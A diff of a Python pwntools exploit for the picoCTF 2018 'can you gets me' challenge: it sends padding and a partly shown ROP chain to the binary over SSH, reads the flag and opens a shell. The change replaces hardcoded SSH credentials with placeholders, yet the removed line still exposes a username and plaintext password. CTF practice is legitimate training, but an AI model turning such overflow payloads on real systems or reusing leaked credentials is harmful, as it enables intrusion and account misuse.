@@ -3,6 +3,9 @@
 from pwn import *
 from struct import pack
 
+USER = 'my_user'
+PASSWD = 'my_passwd'
+
 # Padding goes here
 p = ''
 
@@ -43,7 +46,7 @@ p += pack('<I', 0x0806cd95) # int 0x80
 padding = "A"*28
 payload = padding + p
 
-sh = ssh(host = '2018shell3.picoctf.com', user = 'natsu29122', password = 'lehieunatsu')
+sh = ssh(host = '2018shell3.picoctf.com', user = USER, password = PASSWD)
 r = sh.run('/problems/can-you-gets-me_2_da0270478f868f229487e59ee4a8cf40/gets')
 print r.recv()
 print r.sendline(payload)
@@ -51,4 +54,3 @@ print r.sendline('cat flag.txt')
 r.interactive()
 r.close()
 sh.close()
-#print payload
